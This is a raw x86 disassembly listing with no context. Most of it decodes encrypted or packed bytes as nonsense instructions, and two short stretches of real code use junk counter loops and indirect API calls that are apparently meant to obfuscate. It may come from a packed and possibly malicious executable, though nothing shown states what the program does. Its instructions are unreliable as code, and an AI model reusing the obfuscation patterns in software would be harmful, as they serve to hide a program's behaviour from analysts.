  40738b:	ret    0x7e7e
  40738e:	add    eax,0xde7e7e7c
  407393:	mov    bl,0xdf
  407395:	out    0x55,eax
  407397:	shr    bl,cl
  407399:	in     al,dx
  40739a:	dec    esi
  40739b:	ja     0x407413
  40739d:	lds    eax,FWORD PTR [ebx-0x74]
  4073a0:	iret   
  4073a1:	outs   dx,DWORD PTR ds:[esi]
  4073a2:	mov    edi,0x56625ab3
  4073a7:	rcl    BYTE PTR [edx+0x61],0x1f
  4073ab:	ins    DWORD PTR es:[edi],dx
  4073ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073ad:	jmp    0xf6c1:0xf0c8a407
  4073b4:	imul   edx,DWORD PTR ds:0xf308fec,0xffffff9c
  4073bb:	ins    DWORD PTR es:[edi],dx
  4073bc:	cld    
  4073bd:	pop    ss
  4073be:	jb     0x4073ac
  4073c0:	mov    al,ds:0x38bd72cb
  4073c5:	sti    
  4073c6:	inc    eax
  4073c7:	das    
  4073c8:	sbb    dl,bh
  4073ca:	cmp    eax,0xeaf169fe
  4073cf:	mov    ah,0x10
  4073d1:	inc    esi
  4073d2:	or     BYTE PTR [eax+0x57b3b642],0xd9
  4073d9:	aad    0x8b
  4073db:	jns    0x407376
  4073dd:	sub    DWORD PTR [esi+0x32],esp
  4073e0:	push   ebp
  4073e1:	jp     0x40745c
  4073e3:	inc    eax
  4073e4:	lds    esp,FWORD PTR [ebx+0x7cfa13f0]
  4073ea:	pop    ds
  4073eb:	xor    DWORD PTR [esi-0x7d],ebp
  4073ee:	xchg   ebx,eax
  4073ef:	sbb    DWORD PTR [di],edi
  4073f2:	pop    ecx
  4073f3:	je     0x407389
  4073f5:	or     DWORD PTR [eax],edx
  4073f7:	adc    edi,eax
  4073f9:	add    eax,edi
  4073fb:	mov    dl,0x1
  4073fd:	fs sahf 
  4073ff:	fnsave [edx]
  407401:	pusha  
  407402:	cld    
  407403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407404:	xchg   edi,eax
  407405:	push   ds
  407406:	sub    cl,BYTE PTR [edx-0xe]
  407409:	stos   BYTE PTR es:[edi],al
  40740a:	adc    bl,BYTE PTR [edx+ebp*2-0x2852a304]
  407411:	xchg   esi,eax
  407412:	adc    DWORD PTR [edx+0x410bb081],0x18
  407419:	lahf   
  40741a:	outs   dx,BYTE PTR ds:[esi]
  40741b:	mov    ebx,0x11d8edde
  407420:	call   0x71aa0953
  407425:	stos   BYTE PTR es:[edi],al
  407426:	jo     0x407403
  407428:	ins    DWORD PTR es:[edi],dx
  407429:	ret    0xfa8b
  40742c:	test   eax,0xb39ac851
  407431:	mov    al,0xea
  407433:	int3   
  407434:	inc    esp
  407435:	retf   0x41e8
  407438:	mov    ebp,0x48ee61d9
  40743d:	xor    al,0x72
  40743f:	cmp    al,0x19
  407441:	mov    edi,0x3a90d0ed
  407446:	push   ds
  407447:	push   ebx
  407448:	jae    0x40747b
  40744a:	retf   
  40744b:	push   0x77
  40744d:	sub    edi,edi
  40744f:	pop    ebx
  407450:	or     BYTE PTR [ebx-0x8ff4bd],dh
  407456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407457:	push   esp
  407458:	ins    BYTE PTR es:[edi],dx
  407459:	xor    al,0x84
  40745b:	jbe    0x407434
  40745d:	ror    cl,cl
  40745f:	mov    edi,0x1ad30505
  407464:	sub    ebx,DWORD PTR [edi-0x212764bb]
  40746a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40746b:	sbb    edi,ebx
  40746d:	and    esi,DWORD PTR [esi+0x64]
  407470:	stc    
  407471:	lea    ecx,[ebp+0x4845f1c2]
  407477:	mov    ah,0xe7
  407479:	cwde   
  40747a:	jp     0x40745a
  40747c:	mov    ah,0xbc
  40747e:	lock dec ebx
  407480:	clc    
  407481:	scas   eax,DWORD PTR es:[edi]
  407482:	ficom  DWORD PTR [eax]
  407484:	neg    BYTE PTR [eax+eax*8]
  407487:	sahf   
  407488:	pop    edx
  407489:	ja     0x40743f
  40748b:	and    bh,cl
  40748d:	xchg   DWORD PTR [edi],edi
  40748f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407490:	sbb    al,BYTE PTR [ecx+0x5119e231]
  407496:	jmp    0x4074dc
  407498:	sub    al,0xfd
  40749a:	sbb    edx,edi
  40749c:	int3   
  40749d:	pop    edi
  40749e:	cmp    al,0xf0
  4074a0:	inc    ecx
  4074a1:	jle    0x407429
  4074a3:	imul   ebx,ebp,0xffffffc2
  4074a6:	out    dx,al
  4074a7:	out    0x71,al
  4074a9:	dec    esi
  4074aa:	test   ebp,eax
  4074ac:	mov    WORD PTR [edx-0x10],ss
  4074af:	push   0xffffff8e
  4074b1:	cmp    DWORD PTR [eax-0x9698b03],esi
  4074b7:	cmp    BYTE PTR gs:[ecx],ah
  4074ba:	jmp    0x60395cdb
  4074bf:	push   esi
  4074c0:	out    dx,eax
  4074c1:	mov    ss,WORD PTR [ecx]
  4074c3:	sti    
  4074c4:	leave  
  4074c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074c6:	or     al,0x3f
  4074c8:	cs cs stc 
  4074cb:	imul   ebx,DWORD PTR [eax+0x47],0x6d
  4074cf:	daa    
  4074d0:	xor    edi,DWORD PTR [eax]
  4074d2:	adc    DWORD PTR [ebp-0x5d67607],ecx
  4074d8:	push   0xa02db8a2
  4074dd:	sbb    ah,BYTE PTR ds:0x2397d3e0
  4074e3:	nop
  4074e4:	iret   
  4074e5:	cdq    
  4074e6:	adc    ch,al
  4074e8:	pushf  
  4074e9:	pop    ecx
  4074ea:	mov    bl,0xc7
  4074ec:	cmp    ah,BYTE PTR [edi+ecx*8]
  4074ef:	push   edx
  4074f0:	iret   
  4074f1:	or     al,bl
  4074f3:	dec    ecx
  4074f4:	jae    0x40756b
  4074f6:	cmp    bl,BYTE PTR [eax-0x7eb67637]
  4074fc:	out    dx,al
  4074fd:	mov    edx,esp
  4074ff:	cmp    cx,WORD PTR [edx+0x3647d880]
  407506:	repz cmp al,0xa2
  407509:	test   al,0x8b
  40750b:	fisttp WORD PTR [ebp-0x7e]
  40750e:	or     eax,DWORD PTR [esi]
  407510:	sbb    esp,DWORD PTR [edi]
  407512:	leave  
  407513:	stc    
  407514:	cmp    ecx,DWORD PTR [ecx-0x5f694b6f]
  40751a:	mov    DWORD PTR [edi],edx
  40751c:	jge    0x40753a
  40751e:	das    
  40751f:	mov    WORD PTR [ebp+0x50],es
  407522:	push   esp
  407523:	aaa    
  407524:	out    dx,eax
  407525:	jne    0x407509
  407527:	xor    esp,edi
  407529:	sbb    ecx,DWORD PTR [ebx+0x7f0cd1f7]
  40752f:	lahf   
  407530:	es iret 
  407532:	pop    ecx
  407533:	xchg   ebp,eax
  407534:	mov    esp,0x1a66ab6c
  407539:	dec    ecx
  40753a:	repz bound ebp,QWORD PTR [ecx+0x22]
  40753e:	add    BYTE PTR ds:0xea45f9db,cl
  407544:	mov    cl,BYTE PTR [edi]
  407546:	sar    edx,cl
  407548:	dec    ebp
  407549:	lods   eax,DWORD PTR ds:[esi]
  40754a:	arpl   bp,bx
  40754c:	or     dl,bh
  40754e:	retf   
  40754f:	jp     0x4075a9
  407551:	jl     0x407592
  407553:	daa    
  407554:	jns    0x407578
  407556:	adc    BYTE PTR [ecx+ecx*2],dh
  407559:	jge    0x4075c1
  40755b:	in     al,dx
  40755c:	fsubr  QWORD PTR [bp+di+0x72]
  407560:	leave  
  407561:	test   al,0xc7
  407563:	push   esp
  407564:	dec    eax
  407565:	inc    edx
  407566:	add    eax,DWORD PTR [edi-0x7f3bf02b]
  40756c:	and    eax,0x7373df30
  407571:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  407573:	cwde   
  407574:	mov    ebx,0x76484dea
  407579:	cs fs push ss
  40757c:	mov    esp,ecx
  40757e:	(bad)  
  407580:	push   0xffffffd0
  407582:	sahf   
  407583:	fcom   QWORD PTR [edx-0x69]
  407586:	icebp  
  407587:	and    al,BYTE PTR [eax]
  407589:	push   eax
  40758a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40758b:	sub    ebp,DWORD PTR [ecx-0x553c4a96]
  407591:	push   ecx
  407592:	adc    BYTE PTR [eax-0x44],0x1e
  407596:	xchg   esi,eax
  407597:	xchg   DWORD PTR [ebx],esp
  407599:	xor    ch,BYTE PTR [edx+0x61]
  40759c:	retf   0x45c7
  40759f:	in     al,dx
  4075a0:	xor    DWORD PTR [ebp+0x5135f89c],eax
  4075a6:	add    eax,0x77b80000
  4075ab:	xchg   ebp,eax
  4075ac:	add    BYTE PTR [eax],al
  4075ae:	mov    ecx,DWORD PTR ds:0x4337d3
  4075b4:	sub    DWORD PTR ds:0x43378f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x43377f
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x4337eb,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43378f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43378f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43378f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43378f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43378f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	cmp    al,BYTE PTR [eax]
  407657:	ja     0x4075dd
  407659:	adc    eax,eax
  40765b:	jle    0x4076db
  40765d:	add    eax,0x727e7e7c
  407662:	dec    ebp
  407663:	sahf   
  407664:	(bad)  
  407667:	and    al,0xf7
  407669:	out    0x47,al
  40766b:	push   esi
  40766c:	fcmovnb st,st(4)
  40766e:	out    dx,eax
  40766f:	sub    al,0x68
  407671:	mov    ds,edi
  407673:	fbstp  TBYTE PTR [edi]
  407675:	(bad)  
  407676:	sbb    eax,0xbb50d56c
  40767b:	or     al,0x81
  40767d:	int3   
  40767e:	call   0xe909:0x45e70de6
  407685:	or     bl,BYTE PTR [eax]
  407687:	jne    0x4076d1
  407689:	daa    
  40768a:	inc    eax
  40768b:	(bad)  
  40768c:	call   0x9c5e:0x87cb4255
  407693:	mov    bh,dl
  407695:	mov    ebp,0x842880ed
  40769a:	mov    cl,0x32
  40769c:	(bad)  
  40769d:	and    eax,0xfd7b2421
  4076a2:	lock mov ah,0x78
  4076a5:	jne    0x407676
  4076a7:	and    bl,BYTE PTR [esi]
  4076a9:	inc    esp
  4076aa:	sub    al,0xe5
  4076ac:	mov    edi,0x4cbde3cd
  4076b1:	pop    eax
  4076b2:	stc    
  4076b3:	dec    esp
  4076b4:	adc    cl,BYTE PTR [esi+ebx*4]
  4076b7:	sub    al,0xe2
  4076b9:	ja     0x407690
  4076bb:	push   0xffffffb9
  4076bd:	int    0xee
  4076bf:	xor    al,0xac
  4076c1:	sub    edx,ebx
  4076c3:	mov    edx,ebp
  4076c5:	fidivr WORD PTR ds:[edi+0x34]
  4076c9:	sbb    DWORD PTR ds:0x988f8bdd,ebx
  4076cf:	mov    ch,0xa6
  4076d1:	mov    edx,0xdb17d01a
  4076d6:	inc    esi
  4076d7:	cmp    eax,0x9cd87ce
  4076dc:	(bad)  
  4076dd:	out    0x83,al
  4076df:	out    0x6,eax
  4076e1:	dec    edi
  4076e2:	push   ebp
  4076e3:	xchg   DWORD PTR [ebx-0x7347c38],esi
  4076e9:	idiv   DWORD PTR [esp+edx*1+0x77]
  4076ed:	add    DWORD PTR [edi-0x6d],esp
  4076f0:	outs   dx,DWORD PTR ds:[esi]
  4076f1:	pop    ecx
  4076f2:	cmp    ebp,DWORD PTR [bp+si-0x718]
  4076f7:	add    BYTE PTR [eax+ebx*2+0x67],dl
  4076fb:	push   eax
  4076fc:	test   ch,dh
  4076fe:	ins    BYTE PTR es:[edi],dx
  4076ff:	retf   
  407700:	adc    ebx,DWORD PTR [edi-0x60fc1e9b]
  407706:	iret   
  407707:	les    esp,FWORD PTR [eax+edi*1-0x6f]
  40770b:	jp     0x40775f
  40770d:	sub    BYTE PTR [eax],0x2
  407710:	mov    esp,0xdaecf4f3
  407715:	xor    eax,0x3dd6ca57
  40771a:	xor    ah,BYTE PTR [edx]
  40771c:	mov    WORD PTR [eax+esi*1+0x4d],ss
  407720:	bound  ebx,QWORD PTR [esi+0x70]
  407723:	inc    edi
  407724:	push   0x3b42acb0
  407729:	sbb    ch,BYTE PTR [edi+eax*4]
  40772c:	(bad)  [eax]
  40772e:	je     0x407746
  407730:	push   eax
  407731:	(bad)  
  407733:	cli    
  407734:	dec    ebx
  407735:	and    DWORD PTR [esi-0x16677739],ebx
  40773b:	pushf  
  40773c:	add    ebx,DWORD PTR [eax]
  40773e:	or     al,0xab
  407740:	mov    dh,0xcf
  407742:	adc    DWORD PTR [ebx+0x74],ebp
  407745:	inc    esp
  407746:	ror    BYTE PTR es:[ebx+0x1365f3ac],cl
  40774d:	fdivr  QWORD PTR [ebp-0x2]
  407750:	outs   dx,DWORD PTR ds:[esi]
  407751:	xchg   ecx,eax
  407752:	xchg   BYTE PTR [ebx],al
  407754:	ins    BYTE PTR es:[edi],dx
  407755:	sti    
  407756:	sbb    al,0xdb
  407758:	pushf  
  407759:	xchg   edx,eax
  40775a:	inc    esi
  40775b:	aam    0x4f
  40775d:	fnstcw WORD PTR [edi]
  40775f:	(bad)  
  407760:	mov    fs,WORD PTR [esp+esi*1-0x6f]
  407764:	xor    BYTE PTR [ebx-0xf],cl
  407767:	(bad)  
  407768:	cli    
  407769:	loope  0x40771d
  40776b:	cld    
  40776c:	mov    ah,0x9b
  40776e:	test   eax,0xa7548fb
  407773:	sub    DWORD PTR [edi-0xa18bb3e],edi
  407779:	jns    0x4077ae
  40777b:	inc    eax
  40777c:	popa   
  40777d:	test   al,0xe9
  40777f:	push   0xa2833c9b
  407784:	xor    al,BYTE PTR [ebx-0x6ec93e2f]
  40778a:	int    0x10
  40778c:	arpl   WORD PTR [ecx-0x63],bp
  40778f:	pop    eax
  407790:	mov    bl,0x23
  407792:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407793:	add    ah,ah
  407795:	fsubr  DWORD PTR [edi+0x3de5b23f]
  40779b:	jns    0x407777
  40779d:	sar    BYTE PTR ds:0x6fc47da1,1
  4077a3:	lds    esi,FWORD PTR [edx]
  4077a5:	inc    ecx
  4077a6:	mov    eax,0x4d5a91db
  4077ab:	push   ds
  4077ac:	ja     0x40777a
  4077ae:	jo     0x407784
  4077b0:	sub    DWORD PTR [edi-0x26adbe43],ebx
  4077b6:	in     al,0xe4
  4077b8:	mov    al,ds:0x650b818
  4077bd:	xchg   ebx,eax
  4077be:	xchg   ebx,eax
  4077bf:	test   esi,ebp
  4077c1:	repnz mul BYTE PTR [edi+0x3d]
  4077c5:	ja     0x407832
  4077c7:	or     BYTE PTR [edi],cl
  4077c9:	push   ecx
  4077ca:	inc    ebx
  4077cb:	and    dl,ch
  4077cd:	pop    edi
  4077ce:	mov    cl,0x5
  4077d0:	mov    WORD PTR [eax+0x23cd8def],fs
  4077d6:	sub    eax,ecx
  4077d8:	test   al,0x66
  4077da:	and    eax,0xdd954f79
  4077df:	into   
  4077e0:	shl    BYTE PTR [ebx],cl
  4077e2:	dec    esp
  4077e3:	iret   
  4077e4:	push   ebp
  4077e5:	dec    ebx
  4077e6:	pop    edi
  4077e7:	push   ds
  4077e8:	cmp    esp,esp
  4077ea:	mov    al,0x4a
  4077ec:	nop
  4077ed:	mov    bl,0xc7
  4077ef:	cld    
  4077f0:	out    dx,al
  4077f1:	push   edx
  4077f2:	cmp    esi,DWORD PTR [edx+0x26]
  4077f5:	cmc    
  4077f6:	dec    edi
  4077f7:	push   edi
  4077f8:	xchg   esi,eax
  4077f9:	xchg   edx,eax
  4077fa:	sahf   
  4077fb:	enter  0xdc4e,0x9f
  4077ff:	stc    
  407800:	out    dx,eax
  407801:	(bad)  
  407802:	mov    cl,0x7a
  407804:	mov    bl,0x85
  407806:	rol    DWORD PTR [ebx-0xfd89737],cl
  40780c:	add    al,0x70
  40780e:	(bad)  
  40780f:	clc    
  407810:	stos   BYTE PTR es:[edi],al
  407811:	adc    BYTE PTR [ebx],bl
  407813:	sbb    cl,al
  407815:	xchg   ebx,eax
  407816:	sti    
  407817:	and    ecx,ebp
  407819:	loope  0x4077ad
  40781b:	mov    cl,0xf6
  40781d:	cld    
  40781e:	dec    esi
  40781f:	or     ch,ch
  407821:	scas   al,BYTE PTR es:[edi]
  407822:	mov    ?,WORD PTR [edi]
  407824:	lds    edi,FWORD PTR [ebx]
  407826:	ret    0x72c
  407829:	sbb    BYTE PTR [ebp+0x56ad0724],0xa3
  407830:	fistp  QWORD PTR [eax+0x65713d6a]
  407836:	rol    BYTE PTR [ebp+0x47af71a5],1
  40783c:	sbb    eax,0x5d1641d
  407841:	mov    dl,0xab
  407843:	shl    BYTE PTR [edx-0x43],0xfa
  407847:	shl    edx,cl
  407849:	test   DWORD PTR [esi],edi
  40784b:	int3   
  40784c:	cli    
  40784d:	cli    
  40784e:	mov    edx,0xd716ac32
  407853:	mov    ecx,0xb76bab77
  407858:	stos   BYTE PTR es:[edi],al
  407859:	push   ds
  40785a:	or     edi,ebp
  40785c:	mov    ah,0x2f
  40785e:	aaa    
  40785f:	jmp    0xe8cc82ac
  407864:	neg    BYTE PTR ds:0xceec8f1a
  40786a:	mov    eax,0xce2b56b1
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x43377f,0x4337e3
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43389b,0x12
  40788b:	cmp    DWORD PTR ds:0x43389b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43389b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43389b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43389b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43381f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43381f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43381f,esi
  4078e0:	cmp    DWORD PTR ds:0x43381f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43381f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x77,eax
  407922:	lds    ebp,FWORD PTR [ecx+0x7a]
  407925:	and    al,0xce
  407927:	jle    0x4079a7
  407929:	add    eax,0x107e7e7c
  40792e:	dec    ebx
  40792f:	and    ch,BYTE PTR [edi]
  407931:	mov    dl,0x38
  407933:	repnz cli 
  407935:	mov    esp,0x82f1723b
  40793a:	(bad)  
  40793b:	outs   dx,DWORD PTR ds:[esi]
  40793c:	dec    edx
  40793d:	sub    bh,dh
  40793f:	xor    esp,DWORD PTR [eax+0x7c]
  407942:	and    DWORD PTR [ecx+0x55],ebp
  407945:	add    bh,BYTE PTR [esp+edi*8-0x25]
  407949:	push   edx
  40794a:	xor    al,0xd0
  40794c:	or     ch,dh
  40794e:	loope  0x40798c
  407950:	scas   eax,DWORD PTR es:[edi]
  407951:	scas   eax,DWORD PTR es:[edi]
  407952:	mov    ds:0xe8f7761,eax
  407957:	push   0xaabae901
  40795c:	cmp    BYTE PTR [edx-0x12fe7f65],0xf9
  407963:	sub    edi,DWORD PTR [edx-0x4a]
  407966:	sbb    ch,al
  407968:	sti    
  407969:	add    al,BYTE PTR [ebx]
  40796b:	sbb    cl,BYTE PTR [esi+ebx*1]
  40796e:	cmc    
  40796f:	retf   0xb77d
  407972:	push   edx
  407973:	ficomp WORD PTR [edi-0x71]
  407976:	adc    al,0xca
  407978:	call   0x6c43:0xfc7829ff
  40797f:	ins    DWORD PTR es:[edi],dx
  407980:	pop    edi
  407981:	pop    eax
  407982:	sub    eax,0xa3f7fb5d
  407987:	pop    ss
  407988:	pop    edx
  407989:	jnp    0x4079e7
  40798b:	fdivr  DWORD PTR [edx]
  40798d:	mov    ch,0x61
  40798f:	lods   al,BYTE PTR ds:[esi]
  407990:	xlat   BYTE PTR ds:[ebx]
  407991:	stos   BYTE PTR es:[edi],al
  407992:	jge    0x4079af
  407994:	pop    esp
  407995:	jb     0x4079f3
  407997:	xlat   BYTE PTR ds:[ebx]
  407998:	(bad)  
  407999:	scas   al,BYTE PTR es:[edi]
  40799a:	jno    0x40791f
  40799c:	pop    ebp
  40799d:	fs mov ecx,0x77953ddb
  4079a3:	push   ss
  4079a4:	xchg   ebp,eax
  4079a5:	add    dl,BYTE PTR [ebp+0x5339cca1]
  4079ab:	jecxz  0x407998
  4079ad:	fidiv  WORD PTR [edx-0x2]
  4079b0:	pop    ebx
  4079b1:	sub    eax,ebp
  4079b3:	inc    edx
  4079b4:	pusha  
  4079b5:	pop    esi
  4079b6:	cmp    bh,bl
  4079b8:	stos   BYTE PTR es:[edi],al
  4079b9:	sbb    BYTE PTR [ecx],0x91
  4079bc:	pop    ds
  4079bd:	xor    ecx,DWORD PTR [edx+0x6a9674f9]
  4079c3:	or     esi,DWORD PTR [esi+ebp*4-0x62]
  4079c7:	sbb    al,0x70
  4079c9:	inc    ecx
  4079ca:	cld    
  4079cb:	aam    0x16
  4079cd:	leave  
  4079ce:	mov    ebp,0x44c145e
  4079d3:	loopne 0x407a04
  4079d5:	mov    ch,0x9a
  4079d7:	bound  ecx,QWORD PTR [esi]
  4079d9:	xchg   edx,eax
  4079da:	jae    0x407991
  4079dc:	loope  0x4079b2
  4079de:	sbb    DWORD PTR [ebx+0x5cb67a77],0xf98cfce
  4079e8:	and    DWORD PTR [ebp+eiz*1-0x57],0x18910fdc
  4079f0:	or     eax,0x64a228e7
  4079f5:	pop    edx
  4079f6:	test   DWORD PTR [eax-0x7b],eax
  4079f9:	popf   
  4079fa:	leave  
  4079fb:	mov    eax,0x2434074a
  407a00:	bnd jo 0x407a13
  407a03:	outs   dx,DWORD PTR ds:[esi]
  407a04:	mov    dh,BYTE PTR [ecx]
  407a06:	xor    al,0x50
  407a08:	push   0x40
  407a0a:	(bad)  
  407a0b:	fsub   QWORD PTR [ecx+0x5c]
  407a0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a0f:	(bad)  [ebx+0x5f431f8]
  407a15:	test   BYTE PTR fs:[ebx+0x79],0x2e
  407a1a:	jmp    0xa990:0x67afff02
  407a21:	sbb    eax,ebp
  407a23:	out    0x2f,al
  407a25:	push   ss
  407a26:	scas   eax,DWORD PTR es:[edi]
  407a27:	push   ebx
  407a28:	mov    DWORD PTR [ecx+0x57],edx
  407a2b:	xchg   BYTE PTR [esi-0x637449f4],dh
  407a31:	scas   al,BYTE PTR es:[edi]
  407a32:	(bad)  
  407a33:	cli    
  407a34:	int3   
  407a35:	jnp    0x407a9c
  407a37:	mov    edi,0xfd6e617a
  407a3c:	pop    edi
  407a3d:	imul   edx,DWORD PTR fs:[ecx-0x26e5c9f],0xffffff82
  407a45:	ins    BYTE PTR es:[edi],dx
  407a46:	cmp    BYTE PTR [eax-0x486acafc],ah
  407a4c:	inc    esi
  407a4d:	dec    esp
  407a4e:	icebp  
  407a4f:	lock pop ecx
  407a51:	mov    esp,0xda0eea6d
  407a56:	jns    0x407ac5
  407a58:	jp     0x407ac7
  407a5a:	or     ch,dh
  407a5c:	mov    ah,0xe3
  407a5e:	test   al,0x27
  407a60:	pop    ds
  407a61:	and    ah,BYTE PTR [edx-0xabd540b]
  407a67:	pop    esp
  407a68:	jle    0x407abc
  407a6a:	sbb    edi,esi
  407a6c:	stos   BYTE PTR es:[edi],al
  407a6d:	cli    
  407a6e:	jecxz  0x407ae9
  407a70:	and    BYTE PTR [edx],0xfc
  407a73:	cmp    eax,0xa4dae2f8
  407a78:	inc    ecx
  407a79:	arpl   WORD PTR [edi+0x7c8d6685],ax
  407a7f:	jbe    0x407adb
  407a81:	test   BYTE PTR [esi+0x689a4771],0xe8
  407a88:	leave  
  407a89:	mov    eax,ds:0x439af9ff
  407a8e:	xchg   esp,eax
  407a8f:	sub    DWORD PTR [ebp+0x6d],ecx
  407a92:	add    dh,BYTE PTR [eax]
  407a94:	retf   0x9360
  407a97:	push   esi
  407a98:	(bad)  
  407a99:	dec    esp
  407a9a:	sbb    eax,0xec2c1c95
  407a9f:	scas   al,BYTE PTR es:[edi]
  407aa0:	mov    edx,0x4ee13ea3
  407aa5:	add    DWORD PTR [bp+di-0x23],esp
  407aa9:	or     al,0x3b
  407aab:	sub    bh,BYTE PTR [ebx]
  407aad:	fcomp  QWORD PTR [esp+edx*2+0x59]
  407ab1:	les    esp,FWORD PTR [eax+0x57]
  407ab4:	ja     0x407afa
  407ab6:	pusha  
  407ab7:	lods   al,BYTE PTR ds:[esi]
  407ab8:	pop    esi
  407ab9:	enter  0xa8dd,0xc7
  407abd:	ins    DWORD PTR es:[edi],dx
  407abe:	xchg   ebx,eax
  407abf:	fcmove st,st(0)
  407ac1:	imul   ebx,DWORD PTR [edx-0x799d97c8],0xffffffd3
  407ac8:	mov    edi,gs
  407aca:	jmp    0xe4ac:0x78ed7ce4
  407ad1:	xlat   BYTE PTR ds:[ebx]
  407ad2:	jmp    0xd0c:0x7b9e7f5c
  407ad9:	dec    eax
  407ada:	in     al,0x55
  407adc:	(bad)  
  407add:	(bad)  
  407ade:	shl    bl,1
  407ae0:	test   al,0xc
  407ae2:	mov    BYTE PTR [ecx],bh
  407ae4:	sub    al,0x84
  407ae6:	adc    DWORD PTR [ecx],ecx
  407ae8:	xchg   edx,eax
  407ae9:	lock outs dx,DWORD PTR ds:[esi]
  407aeb:	xchg   ebp,eax
  407aec:	mov    WORD PTR [eax+0x3e],ss
  407aef:	loopne 0x407b41
  407af1:	push   0x69
  407af3:	or     dl,dl
  407af5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407af6:	outs   dx,BYTE PTR ds:[esi]
  407af7:	cmp    eax,0xbfb07823
  407afc:	inc    esp
  407afd:	push   ebx
  407afe:	ds daa 
  407b00:	adc    bh,BYTE PTR [ebp+ebx*2-0x3d]
  407b04:	inc    edi
  407b05:	push   esp
  407b06:	nop
  407b07:	lds    esi,FWORD PTR [ecx-0x25]
  407b0a:	test   ebx,edx
  407b0c:	fsubr  QWORD PTR [edi-0x5a]
  407b0f:	inc    ebp
  407b10:	scas   eax,DWORD PTR es:[edi]
  407b11:	mov    ecx,0xfb0f5dce
  407b16:	inc    eax
  407b17:	mov    edx,0x7504f1
  407b1c:	mov    eax,0x35b4f5fa
  407b21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b22:	hlt    
  407b23:	in     eax,0x70
  407b25:	ins    BYTE PTR es:[edi],dx
  407b26:	sbb    bh,BYTE PTR [ecx-0x60c4b8e2]
  407b2c:	pop    esp
  407b2d:	xor    al,0x6b
  407b2f:	cs pop ebx
  407b31:	push   0xb06cbc31
  407b36:	mov    bl,0xd9
  407b38:	xor    eax,ecx
  407b3a:	adc    DWORD PTR ds:0x43382b,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x4337d3,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433787,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x4338af,0x43378f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43381f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433783
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x433827,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43379f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x4337eb,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x4337eb,0x1370
  407bbe:	lea    eax,[ebp-0xc]
